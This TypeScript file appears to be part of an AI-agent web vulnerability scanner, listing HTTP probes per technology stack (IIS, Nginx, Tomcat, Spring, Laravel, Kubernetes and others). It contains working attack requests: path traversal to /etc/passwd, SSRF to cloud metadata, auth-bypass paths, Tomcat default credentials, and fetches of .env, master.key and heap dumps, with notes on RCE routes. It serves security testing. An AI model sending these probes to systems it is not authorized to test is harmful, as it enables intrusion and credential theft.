// Tech playbook — deterministic test procedures keyed by detected technology. When Vortex fingerprints
// a stack (IIS, Nginx, Spring, etc.), the playbook tells the agent WHAT to send and WHAT to look for
// in the response. Pure DATA — no MCP dependency, no network, no code execution. The agent uses
// http_replay to send each technique's request and checks the response against the detect criteria.
//
// Each technique is a single HTTP request + response check. The agent can run them sequentially or
// pick the highest-severity ones first. The `detect` block is intentionally simple (status codes +
// string-contains) so the agent can evaluate it without DSL compilation.

export interface Technique {
  id: string
  name: string
  request: {
    method: string
    path: string
    headers?: Record<string, string>
    body?: string
    note?: string
  }
  detect: {
    status?: number | number[]
    bodyContains?: string[]
    headerContains?: Record<string, string>
    note?: string
  }
  severity: "info" | "low" | "medium" | "high" | "critical"
  reference?: string
}

export interface TechPlaybook {
  tech: string
  aliases?: string[]
  name: string
  techniques: Technique[]
}

// ── Web Servers ─────────────────────────────────────────────────────────────────────────────────────

const iis: TechPlaybook = {
  tech: "iis",
  aliases: ["microsoft-iis"],
  name: "Microsoft IIS",
  techniques: [
    {
      id: "iis-tilde-enum",
      name: "IIS short filename enumeration (tilde)",
      request: {
        method: "OPTIONS",
        path: "/*~1*/.aspx",
        note: "IIS 8.3 short name: OPTIONS /*~1*/.aspx returns 404 if short names exist, vs 400/200 if not. Compare with OPTIONS /ZZZZZ*~1*/.aspx (should always 404). A differential confirms enumeration surface.",
      },
      detect: {
        status: [404],
        note: "404 on the wildcard OPTIONS means the server resolves tilde paths — short filename enumeration is possible. Send OPTIONS /a*~1*/.aspx through /z*~1*/.aspx to enumerate first chars.",
      },
      severity: "medium",
      reference: "WSTG-CONF-04",
    },
    {
      id: "iis-webconfig-leak",
      name: "web.config disclosure",
      request: { method: "GET", path: "/web.config" },
      detect: {
        status: [200],
        bodyContains: ["<configuration", "<system.web", "<appSettings"],
        note: "web.config served — connection strings, auth keys, and app secrets exposed.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "iis-path-auth-bypass",
      name: "IIS path normalization auth bypass",
      request: {
        method: "GET",
        path: "/admin/..;/",
        note: "IIS + Tomcat/Spring behind IIS: the ..;/ sequence is normalized differently by the reverse proxy vs backend, bypassing path-based auth rules.",
      },
      detect: {
        status: [200, 301, 302],
        note: "A 200 or redirect (not 401/403) suggests the path normalization bypassed access control.",
      },
      severity: "high",
      reference: "WSTG-ATHZ-02",
    },
    {
      id: "iis-ads-source",
      name: "NTFS alternate data stream source disclosure",
      request: {
        method: "GET",
        path: "/default.aspx::$DATA",
        note: "Appending ::$DATA to a filename requests the NTFS data stream — IIS may serve the raw source code instead of executing it.",
      },
      detect: {
        status: [200],
        bodyContains: ["<%@", "<%=", "Imports", "using System"],
        note: "Source code markers in the response body — the server returned the file's source instead of executing it.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "iis-trace-axd",
      name: "ASP.NET Trace.axd exposure",
      request: { method: "GET", path: "/Trace.axd" },
      detect: {
        status: [200],
        bodyContains: ["Application Trace", "Request Details", "Session State"],
        note: "Trace.axd is enabled — exposes request details, session state, and internal paths for every recent request.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

const nginx: TechPlaybook = {
  tech: "nginx",
  aliases: ["openresty"],
  name: "Nginx",
  techniques: [
    {
      id: "nginx-off-by-slash",
      name: "Nginx alias traversal (off-by-slash)",
      request: {
        method: "GET",
        path: "/static../etc/passwd",
        note: "When nginx uses `alias` inside a `location /static/` block without a trailing slash, /static../etc/passwd escapes the alias root. Try common prefixes: /assets../, /files../, /images../, /media../.",
      },
      detect: {
        status: [200],
        bodyContains: ["root:"],
        note: "File content from outside the web root — alias traversal confirmed.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "nginx-status",
      name: "Nginx stub_status exposure",
      request: { method: "GET", path: "/nginx_status" },
      detect: {
        status: [200],
        bodyContains: ["Active connections:", "server accepts handled requests"],
      },
      severity: "low",
      reference: "WSTG-CONF-05",
    },
    {
      id: "nginx-stub-status-alt",
      name: "Nginx stub_status (alt path)",
      request: { method: "GET", path: "/stub_status" },
      detect: {
        status: [200],
        bodyContains: ["Active connections:", "server accepts handled requests"],
      },
      severity: "low",
      reference: "WSTG-CONF-05",
    },
    {
      id: "nginx-merge-slashes",
      name: "Nginx merge_slashes auth bypass",
      request: {
        method: "GET",
        path: "//admin/",
        note: "With merge_slashes on (default), //admin/ normalizes to /admin/ after the location match — but a location block matching ^/admin may not match the double-slash, bypassing path-based auth.",
      },
      detect: {
        status: [200, 301, 302],
        note: "Response differs from a normal /admin/ request (which should return 401/403) — possible bypass.",
      },
      severity: "medium",
      reference: "WSTG-ATHZ-02",
    },
    {
      id: "nginx-config-leak",
      name: "Nginx configuration leak",
      request: { method: "GET", path: "/nginx.conf" },
      detect: {
        status: [200],
        bodyContains: ["server {", "location", "proxy_pass"],
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

const apache: TechPlaybook = {
  tech: "apache",
  aliases: ["apache-httpd", "httpd"],
  name: "Apache HTTP Server",
  techniques: [
    {
      id: "apache-server-status",
      name: "Apache server-status exposure",
      request: { method: "GET", path: "/server-status" },
      detect: {
        status: [200],
        bodyContains: ["Apache Server Status", "Server uptime", "Total accesses"],
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "apache-server-info",
      name: "Apache server-info exposure",
      request: { method: "GET", path: "/server-info" },
      detect: {
        status: [200],
        bodyContains: ["Apache Server Information", "Module Name"],
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "apache-htaccess-leak",
      name: ".htaccess file disclosure",
      request: { method: "GET", path: "/.htaccess" },
      detect: {
        status: [200],
        bodyContains: ["RewriteRule", "AuthType", "Deny from", "Allow from", "Options"],
        note: ".htaccess served — rewrite rules, auth config, and directory options exposed.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "apache-mod-proxy-ssrf",
      name: "Apache mod_proxy SSRF",
      request: {
        method: "GET",
        path: "/proxy/http://169.254.169.254/latest/meta-data/",
        note: "If mod_proxy with ProxyPass or ProxyRequests is misconfigured, the server forwards to the cloud metadata endpoint.",
      },
      detect: {
        status: [200],
        bodyContains: ["ami-id", "instance-id", "iam"],
        note: "Cloud metadata content in response — SSRF through mod_proxy confirmed.",
      },
      severity: "critical",
      reference: "WSTG-INPV-19",
    },
    {
      id: "apache-cgi-printenv",
      name: "CGI printenv script",
      request: { method: "GET", path: "/cgi-bin/printenv" },
      detect: {
        status: [200],
        bodyContains: ["SERVER_NAME", "DOCUMENT_ROOT", "PATH="],
        note: "CGI printenv script active — server environment variables exposed.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
  ],
}

const tomcat: TechPlaybook = {
  tech: "tomcat",
  aliases: ["apache-tomcat"],
  name: "Apache Tomcat",
  techniques: [
    {
      id: "tomcat-manager",
      name: "Tomcat Manager exposure",
      request: { method: "GET", path: "/manager/html" },
      detect: {
        status: [200, 401],
        bodyContains: ["Tomcat Web Application Manager", "401 Unauthorized"],
        note: "200 = unauthenticated manager access (critical). 401 = manager exists but requires credentials (brute-force target).",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "tomcat-host-manager",
      name: "Tomcat Host Manager",
      request: { method: "GET", path: "/host-manager/html" },
      detect: {
        status: [200, 401],
        bodyContains: ["Tomcat Virtual Host Manager"],
        note: "Host Manager exposed — virtual host management interface reachable.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "tomcat-examples",
      name: "Tomcat examples application",
      request: { method: "GET", path: "/examples/" },
      detect: {
        status: [200],
        bodyContains: ["Apache Tomcat Examples", "Servlet", "JSP"],
        note: "Examples webapp deployed — servlets and JSP samples expose information and may have known vulnerabilities.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "tomcat-default-creds",
      name: "Tomcat manager default credentials",
      request: {
        method: "GET",
        path: "/manager/html",
        headers: { Authorization: "Basic dG9tY2F0OnRvbWNhdA==" },
        note: "Try tomcat:tomcat default credentials.",
      },
      detect: {
        status: [200],
        bodyContains: ["Tomcat Web Application Manager", "Deploy"],
        note: "Default tomcat:tomcat credentials accepted — full deployment control.",
      },
      severity: "critical",
      reference: "WSTG-ATHN-02",
    },
    {
      id: "tomcat-version-leak",
      name: "Tomcat version via error page",
      request: { method: "GET", path: "/nonexistent_test_path_vortex" },
      detect: {
        status: [404],
        bodyContains: ["Apache Tomcat/"],
        note: "Tomcat version disclosed in the default 404 error page.",
      },
      severity: "info",
      reference: "WSTG-INFO-02",
    },
  ],
}

// ── Frameworks ──────────────────────────────────────────────────────────────────────────────────────

const spring: TechPlaybook = {
  tech: "spring",
  aliases: ["spring-boot", "spring-framework"],
  name: "Spring Boot",
  techniques: [
    {
      id: "spring-actuator-env",
      name: "Spring Actuator /env endpoint",
      request: { method: "GET", path: "/actuator/env" },
      detect: {
        status: [200],
        bodyContains: ["propertySources", "activeProfiles"],
        note: "Actuator /env exposed — environment variables, config properties, and potentially secrets visible.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "spring-actuator-heapdump",
      name: "Spring Actuator /heapdump",
      request: {
        method: "GET",
        path: "/actuator/heapdump",
        note: "Heap dump contains in-memory secrets, session tokens, database credentials. Large download — check status only.",
      },
      detect: {
        status: [200],
        headerContains: { "content-type": "application/octet-stream" },
        note: "Heap dump downloadable — extract secrets with Eclipse MAT or jhat.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "spring-actuator-mappings",
      name: "Spring Actuator /mappings",
      request: { method: "GET", path: "/actuator/mappings" },
      detect: {
        status: [200],
        bodyContains: ["dispatcherServlets", "requestMappingConditions"],
        note: "All URL mappings exposed — full API surface enumerated.",
      },
      severity: "medium",
      reference: "WSTG-INFO-06",
    },
    {
      id: "spring-h2-console",
      name: "Spring H2 Console",
      request: { method: "GET", path: "/h2-console" },
      detect: {
        status: [200],
        bodyContains: ["H2 Console", "JDBC URL"],
        note: "H2 Console reachable — arbitrary SQL execution and potentially RCE via ALIAS.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "spring-actuator-configprops",
      name: "Spring Actuator /configprops",
      request: { method: "GET", path: "/actuator/configprops" },
      detect: {
        status: [200],
        bodyContains: ["beans", "prefix"],
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
  ],
}

const django: TechPlaybook = {
  tech: "django",
  name: "Django",
  techniques: [
    {
      id: "django-debug-404",
      name: "Django DEBUG=True detection",
      request: {
        method: "GET",
        path: "/nonexistent_vortex_test_12345",
        note: "A 404 on a non-existent path: if Django DEBUG=True, the response lists all URL patterns.",
      },
      detect: {
        status: [404],
        bodyContains: ["You're seeing this error because you have DEBUG = True", "URLconf"],
        note: "Django debug mode active — full URL routing table and settings exposed on every error.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "django-admin",
      name: "Django admin panel",
      request: { method: "GET", path: "/admin/" },
      detect: {
        status: [200],
        bodyContains: ["Django administration", "Log in", "django"],
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "django-debug-toolbar",
      name: "Django Debug Toolbar",
      request: { method: "GET", path: "/__debug__/" },
      detect: {
        status: [200],
        bodyContains: ["djdt", "debug toolbar"],
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

const rails: TechPlaybook = {
  tech: "rails",
  aliases: ["ruby-on-rails"],
  name: "Ruby on Rails",
  techniques: [
    {
      id: "rails-info-properties",
      name: "Rails info properties",
      request: { method: "GET", path: "/rails/info/properties" },
      detect: {
        status: [200],
        bodyContains: ["Rails version", "Ruby version", "Application root"],
        note: "Rails info page exposed — full framework version, Ruby version, middleware stack, and application root path.",
      },
      severity: "medium",
      reference: "WSTG-INFO-02",
    },
    {
      id: "rails-info-routes",
      name: "Rails routing table",
      request: { method: "GET", path: "/rails/info/routes" },
      detect: {
        status: [200],
        bodyContains: ["Path", "Verb", "Controller#Action"],
        note: "Full routing table exposed — every endpoint, verb, and controller action.",
      },
      severity: "medium",
      reference: "WSTG-INFO-06",
    },
    {
      id: "rails-active-storage",
      name: "Rails Active Storage exposure",
      request: { method: "GET", path: "/rails/active_storage/blobs/" },
      detect: {
        status: [200, 302],
        note: "Active Storage routes accessible — uploaded files may be enumerable.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "rails-master-key",
      name: "Rails master key disclosure",
      request: { method: "GET", path: "/config/master.key" },
      detect: {
        status: [200],
        note: "master.key served — this key decrypts Rails credentials (database passwords, API keys, secrets).",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
  ],
}

const express: TechPlaybook = {
  tech: "express",
  aliases: ["node", "nodejs", "node.js"],
  name: "Express / Node.js",
  techniques: [
    {
      id: "express-stack-trace",
      name: "Express stack trace on malformed JSON",
      request: {
        method: "POST",
        path: "/api/",
        headers: { "Content-Type": "application/json" },
        body: "{invalid json",
        note: "Send malformed JSON — Express in development mode returns a full stack trace with file paths and middleware.",
      },
      detect: {
        status: [400, 500],
        bodyContains: ["SyntaxError", "Unexpected token", "at Object.parse"],
        note: "Stack trace in error response — internal file paths and middleware chain revealed.",
      },
      severity: "medium",
      reference: "WSTG-ERRH-01",
    },
    {
      id: "express-env-leak",
      name: ".env file disclosure",
      request: { method: "GET", path: "/.env" },
      detect: {
        status: [200],
        bodyContains: ["DB_HOST", "SECRET", "API_KEY", "DATABASE_URL", "PASSWORD"],
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "express-source-map",
      name: "JavaScript source map exposure",
      request: { method: "GET", path: "/main.js.map" },
      detect: {
        status: [200],
        bodyContains: ["mappings", "sources", "sourcesContent"],
        note: "Source map served — original TypeScript/JavaScript source code reconstructable.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "express-node-modules",
      name: "node_modules directory traversal",
      request: { method: "GET", path: "/node_modules/" },
      detect: {
        status: [200],
        bodyContains: ["Index of", "package.json", "express"],
        note: "node_modules directory listing — dependency tree and version info exposed.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "express-debug-port",
      name: "Node.js debug inspector",
      request: {
        method: "GET",
        path: "/json",
        note: "Node inspector debug API (usually port 9229) may be proxied through the main app. GET /json lists debug targets.",
      },
      detect: {
        status: [200],
        bodyContains: ["devtoolsFrontendUrl", "webSocketDebuggerUrl"],
        note: "Node.js inspector API reachable — remote code execution via Chrome DevTools protocol.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
  ],
}

const laravel: TechPlaybook = {
  tech: "laravel",
  name: "Laravel",
  techniques: [
    {
      id: "laravel-ignition",
      name: "Laravel Ignition health check",
      request: { method: "GET", path: "/_ignition/health-check" },
      detect: {
        status: [200],
        bodyContains: ["can_execute_commands"],
        note: "Ignition debug tool active — if can_execute_commands is true, RCE is possible via /_ignition/execute-solution.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "laravel-env",
      name: "Laravel .env disclosure",
      request: { method: "GET", path: "/.env" },
      detect: {
        status: [200],
        bodyContains: ["APP_KEY", "DB_PASSWORD", "MAIL_PASSWORD"],
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "laravel-debugbar",
      name: "Laravel Debugbar exposure",
      request: { method: "GET", path: "/_debugbar/open" },
      detect: {
        status: [200],
        bodyContains: ["debugbar"],
        note: "Laravel Debugbar active — queries, sessions, and request details visible.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "laravel-telescope",
      name: "Laravel Telescope dashboard",
      request: { method: "GET", path: "/telescope" },
      detect: {
        status: [200, 302],
        bodyContains: ["Laravel Telescope", "telescope"],
        note: "Telescope dashboard accessible — requests, exceptions, queries, mail, and more monitored.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

const wordpress: TechPlaybook = {
  tech: "wordpress",
  aliases: ["wp"],
  name: "WordPress",
  techniques: [
    {
      id: "wp-user-enum-author",
      name: "WordPress user enumeration via author ID",
      request: {
        method: "GET",
        path: "/?author=1",
        note: "WordPress redirects /?author=N to /author/username/ — leaking valid usernames for brute-force.",
      },
      detect: {
        status: [301, 302],
        headerContains: { location: "/author/" },
        note: "Redirect to /author/<username>/ — user enumeration confirmed.",
      },
      severity: "medium",
      reference: "WSTG-IDNT-04",
    },
    {
      id: "wp-user-enum-api",
      name: "WordPress user list via REST API",
      request: { method: "GET", path: "/wp-json/wp/v2/users" },
      detect: {
        status: [200],
        bodyContains: ['"slug"', '"name"'],
        note: "User list exposed via REST API — usernames and display names available.",
      },
      severity: "medium",
      reference: "WSTG-IDNT-04",
    },
    {
      id: "wp-xmlrpc",
      name: "WordPress XMLRPC enabled",
      request: {
        method: "POST",
        path: "/xmlrpc.php",
        headers: { "Content-Type": "text/xml" },
        body: '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>',
      },
      detect: {
        status: [200],
        bodyContains: ["<methodResponse>", "wp.getUsersBlogs"],
        note: "XMLRPC enabled — brute-force amplification (system.multicall) and SSRF (pingback.ping) possible.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "wp-rest-api",
      name: "WordPress REST API index",
      request: { method: "GET", path: "/wp-json/" },
      detect: {
        status: [200],
        bodyContains: ['"namespaces"', '"wp/v2"'],
        note: "WordPress REST API exposed — site info, routes, and potentially sensitive endpoints enumerable.",
      },
      severity: "low",
      reference: "WSTG-INFO-06",
    },
    {
      id: "wp-debug-log",
      name: "WordPress debug log exposure",
      request: { method: "GET", path: "/wp-content/debug.log" },
      detect: {
        status: [200],
        bodyContains: ["PHP", "Warning", "Error", "Notice"],
        note: "WordPress debug.log served — PHP errors, stack traces, file paths, and potentially credentials.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

// ── Languages / Runtimes ────────────────────────────────────────────────────────────────────────────

const php: TechPlaybook = {
  tech: "php",
  name: "PHP",
  techniques: [
    {
      id: "php-phpinfo",
      name: "phpinfo() exposure",
      request: { method: "GET", path: "/phpinfo.php" },
      detect: {
        status: [200],
        bodyContains: ["PHP Version", "php.ini", "disable_functions"],
        note: "phpinfo() served — PHP version, loaded modules, disable_functions list, document root, and server environment exposed.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "php-info-alt",
      name: "phpinfo() at alt path",
      request: { method: "GET", path: "/info.php" },
      detect: {
        status: [200],
        bodyContains: ["PHP Version", "php.ini"],
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "php-error-reporting",
      name: "PHP error display enabled",
      request: {
        method: "GET",
        path: "/index.php?test[]=",
        note: "Send a malformed array parameter — if display_errors is on, PHP emits a warning with the file path and line number.",
      },
      detect: {
        status: [200, 500],
        bodyContains: ["Warning:", "on line", ".php"],
        note: "PHP warnings displayed — file paths and line numbers leak internal structure.",
      },
      severity: "medium",
      reference: "WSTG-ERRH-01",
    },
    {
      id: "php-xdebug",
      name: "Xdebug remote debugging",
      request: {
        method: "GET",
        path: "/index.php?XDEBUG_SESSION_START=1",
        note: "Trigger Xdebug session — if Xdebug is configured for remote debugging, it opens a connection back to the attacker.",
      },
      detect: {
        headerContains: { "set-cookie": "XDEBUG_SESSION" },
        note: "Xdebug session cookie set — remote debugging may be enabled (check for step-through RCE).",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
  ],
}

const dotnet: TechPlaybook = {
  tech: "dotnet",
  aliases: ["asp.net", "aspnet", ".net"],
  name: "ASP.NET / .NET",
  techniques: [
    {
      id: "dotnet-elmah",
      name: "ELMAH error log exposure",
      request: { method: "GET", path: "/elmah.axd" },
      detect: {
        status: [200],
        bodyContains: ["Error Log for", "ELMAH", "All Errors"],
        note: "ELMAH error log accessible — every unhandled exception with full stack traces, request details, and user info.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "dotnet-trace",
      name: "ASP.NET trace exposure",
      request: { method: "GET", path: "/trace.axd" },
      detect: {
        status: [200],
        bodyContains: ["Application Trace", "Request Details"],
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "dotnet-blazor-debug",
      name: "Blazor boot manifest",
      request: { method: "GET", path: "/_framework/blazor.boot.json" },
      detect: {
        status: [200],
        bodyContains: ["assemblies", "resources"],
        note: "Blazor boot manifest exposed — lists all .NET assemblies loaded client-side (potential decompilation targets).",
      },
      severity: "low",
      reference: "WSTG-INFO-02",
    },
    {
      id: "dotnet-viewstate-unprotected",
      name: "ViewState without MAC validation",
      request: {
        method: "GET",
        path: "/",
        note: "Check any page with a form — look for __VIEWSTATE hidden field. If ViewStateMAC is disabled, the ViewState is exploitable for deserialization RCE (ysoserial.net).",
      },
      detect: {
        status: [200],
        bodyContains: ["__VIEWSTATE"],
        note: "ViewState present — test for MAC validation by tampering (if no validation error, RCE via deserialization).",
      },
      severity: "medium",
      reference: "WSTG-SESS-04",
    },
  ],
}

// ── Infrastructure ──────────────────────────────────────────────────────────────────────────────────

const graphql: TechPlaybook = {
  tech: "graphql",
  name: "GraphQL",
  techniques: [
    {
      id: "graphql-introspection",
      name: "GraphQL introspection query",
      request: {
        method: "POST",
        path: "/graphql",
        headers: { "Content-Type": "application/json" },
        body: '{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}',
      },
      detect: {
        status: [200],
        bodyContains: ["__schema", "queryType"],
        note: "Introspection enabled — entire schema (types, fields, arguments, mutations) enumerable.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "graphql-playground",
      name: "GraphQL IDE exposure",
      request: { method: "GET", path: "/graphql/playground" },
      detect: {
        status: [200],
        bodyContains: ["GraphQL Playground", "graphql-playground"],
      },
      severity: "low",
      reference: "WSTG-CONF-05",
    },
    {
      id: "graphql-graphiql",
      name: "GraphiQL IDE exposure",
      request: { method: "GET", path: "/graphiql" },
      detect: {
        status: [200],
        bodyContains: ["graphiql", "GraphiQL"],
      },
      severity: "low",
      reference: "WSTG-CONF-05",
    },
    {
      id: "graphql-batch",
      name: "GraphQL query batching (DoS amplification)",
      request: {
        method: "POST",
        path: "/graphql",
        headers: { "Content-Type": "application/json" },
        body: '[{"query":"{__typename}"},{"query":"{__typename}"}]',
      },
      detect: {
        status: [200],
        bodyContains: ["__typename"],
        note: "Batched queries accepted — amplification attacks possible (send 1 HTTP request, execute N queries).",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "graphql-field-suggestion",
      name: "GraphQL field suggestion leakage",
      request: {
        method: "POST",
        path: "/graphql",
        headers: { "Content-Type": "application/json" },
        body: '{"query":"{__typena}"}',
        note: "Intentionally misspell a field — many GraphQL servers suggest valid alternatives, revealing the schema even with introspection disabled.",
      },
      detect: {
        status: [200, 400],
        bodyContains: ["Did you mean", "suggestion"],
        note: "Field suggestions active — schema discoverable even without introspection.",
      },
      severity: "low",
      reference: "WSTG-INFO-06",
    },
  ],
}

const kubernetes: TechPlaybook = {
  tech: "kubernetes",
  aliases: ["k8s"],
  name: "Kubernetes",
  techniques: [
    {
      id: "k8s-api-unauth",
      name: "Kubernetes API unauthenticated access",
      request: { method: "GET", path: "/api/v1/namespaces" },
      detect: {
        status: [200],
        bodyContains: ['"kind":"NamespaceList"'],
        note: "Kubernetes API accessible without credentials — cluster takeover possible.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "k8s-metrics",
      name: "Kubernetes /metrics endpoint",
      request: { method: "GET", path: "/metrics" },
      detect: {
        status: [200],
        bodyContains: ["kubernetes_build_info", "apiserver_request_total", "go_goroutines"],
        note: "Prometheus metrics exposed — internal state, request counts, and Go runtime info.",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
    {
      id: "k8s-healthz",
      name: "Kubernetes health endpoints",
      request: { method: "GET", path: "/healthz" },
      detect: {
        status: [200],
        bodyContains: ["ok"],
      },
      severity: "info",
      reference: "WSTG-INFO-02",
    },
  ],
}

const docker: TechPlaybook = {
  tech: "docker",
  aliases: ["docker-registry"],
  name: "Docker",
  techniques: [
    {
      id: "docker-api-version",
      name: "Docker API version endpoint",
      request: { method: "GET", path: "/version" },
      detect: {
        status: [200],
        bodyContains: ["ApiVersion", "Os", "KernelVersion"],
        note: "Docker API exposed — container management, image pull, and host escape possible.",
      },
      severity: "critical",
      reference: "WSTG-CONF-05",
    },
    {
      id: "docker-registry-catalog",
      name: "Docker Registry catalog",
      request: { method: "GET", path: "/v2/_catalog" },
      detect: {
        status: [200],
        bodyContains: ['"repositories"'],
        note: "Docker registry catalog exposed — all image repositories listed.",
      },
      severity: "high",
      reference: "WSTG-CONF-05",
    },
    {
      id: "docker-registry-v2",
      name: "Docker Registry API v2",
      request: { method: "GET", path: "/v2/" },
      detect: {
        status: [200, 401],
        note: "Docker Registry v2 API reachable. 200 = unauthenticated access. 401 = auth required (enumerate with /v2/_catalog).",
      },
      severity: "medium",
      reference: "WSTG-CONF-05",
    },
  ],
}

// ── All playbooks ───────────────────────────────────────────────────────────────────────────────────

export const playbooks: TechPlaybook[] = [
  iis,
  nginx,
  apache,
  tomcat,
  spring,
  django,
  rails,
  express,
  laravel,
  wordpress,
  php,
  dotnet,
  graphql,
  kubernetes,
  docker,
]

const idx = new Map<string, TechPlaybook>()
for (const pb of playbooks) {
  idx.set(pb.tech, pb)
  for (const a of pb.aliases ?? []) idx.set(a, pb)
}

export function playbookFor(tech: string): TechPlaybook | undefined {
  return idx.get(tech.toLowerCase())
}

export function allPlaybooks(): TechPlaybook[] {
  return playbooks
}
